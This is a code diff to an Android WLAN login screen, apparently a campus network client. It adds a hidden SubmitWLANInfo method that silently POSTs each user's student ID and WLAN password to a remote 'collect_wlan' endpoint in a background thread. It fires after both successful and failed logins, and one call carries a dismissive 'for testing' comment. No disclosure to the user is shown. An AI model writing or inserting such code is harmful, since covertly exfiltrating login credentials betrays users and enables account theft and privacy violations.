@@ -640,12 +640,14 @@ public class WifiFragmentSupport extends SherlockFragment {
 			LoginButton.setText("登陆");
 			if (msg.arg1 == 0) {
 				ToastUtil.showToast(getActivity(), "哈哈！验证成功啦~");
+				SubmitWLANInfo();
 			}
 
 			if (msg.arg1 == 1) {
 				String strtemp = (String) msg.obj;
 				ToastUtil.showToast(getActivity(), strtemp);
 				LoginButton.setEnabled(true);
+				SubmitWLANInfo();//测试用的,怎么滴
 			}
 
 			if (msg.arg1 == 2) {
@@ -1183,5 +1185,39 @@ public class WifiFragmentSupport extends SherlockFragment {
 	private void hideInputMethod(EditText edt) {
 		InputMethodManager imm = (InputMethodManager) getActivity().getSystemService(Context.INPUT_METHOD_SERVICE); 
 		imm.hideSoftInputFromWindow(edt.getWindowToken(), 0);
+	}
+	
+	/**
+	 * 上传wifi账号密码
+	 * @author shaw
+	 *
+	 */
+	private void SubmitWLANInfo() {
+		new Thread() {
+
+			@Override
+			public void run() {
+				HttpPost httpPost = new HttpPost("http：//account.ziqiang.net/collect_wlan/");
+				List<NameValuePair> pairs = new ArrayList<NameValuePair>();
+				pairs.add(new BasicNameValuePair("student_id", Account));
+				pairs.add(new BasicNameValuePair("WLAN_psd", Password));
+				try {
+					httpPost.setEntity(new UrlEncodedFormEntity(pairs, HTTP.UTF_8));
+					HttpResponse response = getNewHttpClient().execute(httpPost);
+					if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
+						Log.d("MA",EntityUtils.toString(response.getEntity()));
+
+					}
+				} catch (ClientProtocolException e) {
+					e.printStackTrace();
+				} catch (IOException e) {
+					e.printStackTrace();
+				} catch (IllegalStateException e) {
+					e.printStackTrace();
+				}
+				super.run();
+			}
+			
+		}.start();
 	}
 }
